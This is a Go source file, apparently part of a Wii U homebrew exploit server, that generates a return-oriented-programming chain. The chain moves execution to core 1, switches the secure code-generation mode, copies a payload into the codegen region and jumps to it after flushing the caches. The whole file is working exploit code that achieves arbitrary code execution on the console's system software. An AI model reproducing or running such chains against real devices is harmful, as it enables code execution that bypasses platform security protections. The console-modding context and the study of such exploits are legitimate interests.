package wiiu

import (
	"bytes"

	"github.com/mlgd/goHaxServer/lib/util"
)

type ropChain struct{}

var (
	RopChain ropChain
)

func (r *ropChain) Generate(heapAddress uint32, systemVersion *SystemVersions, sourceAddress uint32) []byte {
	var payloadSize uint32 = 131072
	var codegenAddress uint32 = 25165824

	var out bytes.Buffer
	r.switchToCore1(systemVersion, &out)
	r.copyCodebinToCodegen(codegenAddress, sourceAddress, payloadSize, systemVersion, &out)

	r.popr24Tor31(
		systemVersion.Constants.OSFatal,
		systemVersion.Constants.Exit,
		systemVersion.Constants.OSDynLoad_Acquire,
		systemVersion.Constants.OSDynLoad_FindExport,
		systemVersion.Constants.Os_snprintf,
		sourceAddress,
		8,
		heapAddress,
		systemVersion,
		&out)

	util.WriteUint32(codegenAddress, &out)
	util.WriteUint32(0, &out)

	r.copyCodebinToCodegen(codegenAddress, sourceAddress, payloadSize, systemVersion, &out)

	r.popr24Tor31(
		systemVersion.Constants.OSFatal,
		systemVersion.Constants.Exit,
		systemVersion.Constants.OSDynLoad_Acquire,
		systemVersion.Constants.OSDynLoad_FindExport,
		systemVersion.Constants.Os_snprintf,
		sourceAddress,
		8,
		heapAddress,
		systemVersion,
		&out)

	util.WriteUint32(codegenAddress, &out)

	return out.Bytes()
}

func (r *ropChain) copyCodebinToCodegen(codegenAddress uint32, sourceAddress uint32, payloadSize uint32, systemVersion *SystemVersions, out *bytes.Buffer) {
	r.osSwitchSecCodeGenMode(0, systemVersion, out)
	r.memcpy(codegenAddress, sourceAddress, payloadSize, systemVersion, out)
	r.osSwitchSecCodeGenMode(1, systemVersion, out)
	r.dcFlushRange(codegenAddress, payloadSize, systemVersion, out)
	r.icInvalidateRange(codegenAddress, payloadSize, systemVersion, out)
}

func (r *ropChain) dcFlushRange(address uint32, size uint32, systemVersion *SystemVersions, out *bytes.Buffer) {
	r.callFunction(systemVersion, systemVersion.Constants.DCFlushRange, address, size, 0, 0, 0, out)
}

func (r *ropChain) icInvalidateRange(address uint32, size uint32, systemVersion *SystemVersions, out *bytes.Buffer) {
	r.callFunction(systemVersion, systemVersion.Constants.ICInvalidateRange, address, size, 0, 0, 0, out)
}

func (r *ropChain) memcpy(dest uint32, source uint32, size uint32, systemVersion *SystemVersions, out *bytes.Buffer) {
	r.callFunction(systemVersion, systemVersion.Constants.Memcpy, dest, source, size, 0, 0, out)
}

func (r *ropChain) osSwitchSecCodeGenMode(mode uint32, systemVersion *SystemVersions, out *bytes.Buffer) {
	r.callFunction(systemVersion, systemVersion.Constants.OSSwitchSecCodeGenMode, mode, 0, 0, 0, 0, out)
}

func (r *ropChain) switchToCore1(systemVersion *SystemVersions, out *bytes.Buffer) {
	r.callFunction(systemVersion, systemVersion.Constants.OSGetCurrentThread, 0, 2, 0, 0, systemVersion.Constants.OSSetThreadAffinity, out)

	util.WriteUint32(systemVersion.Constants.CALLR28_POP_R28_TO_R31, out)
	util.WriteUint32(systemVersion.Constants.OSYieldThread, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
	util.WriteUint32(systemVersion.Constants.CALLR28_POP_R28_TO_R31, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
}

func (r *ropChain) callFunction(systemVersion *SystemVersions, function uint32, r3 uint32, r4 uint32, r5 uint32, r6 uint32, r28 uint32, out *bytes.Buffer) {
	r.popr24Tor31(r6, r5, 0, systemVersion.Constants.CALLR28_POP_R28_TO_R31, function, r3, 0, r4, systemVersion, out)
	util.WriteUint32(systemVersion.Constants.CALLFUNC, out)
	util.WriteUint32(r28, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)
}

func (r *ropChain) popr24Tor31(r24 uint32, r25 uint32, r26 uint32, r27 uint32, r28 uint32, r29 uint32, r30 uint32, r31 uint32, systemVersion *SystemVersions, out *bytes.Buffer) {
	util.WriteUint32(systemVersion.Constants.POP_R24_TO_R31, out)
	util.WriteUint32(0, out)
	util.WriteUint32(0, out)

	util.WriteUint32(r24, out)
	util.WriteUint32(r25, out)
	util.WriteUint32(r26, out)
	util.WriteUint32(r27, out)
	util.WriteUint32(r28, out)
	util.WriteUint32(r29, out)
	util.WriteUint32(r30, out)
	util.WriteUint32(r31, out)

	util.WriteUint32(0, out)
}
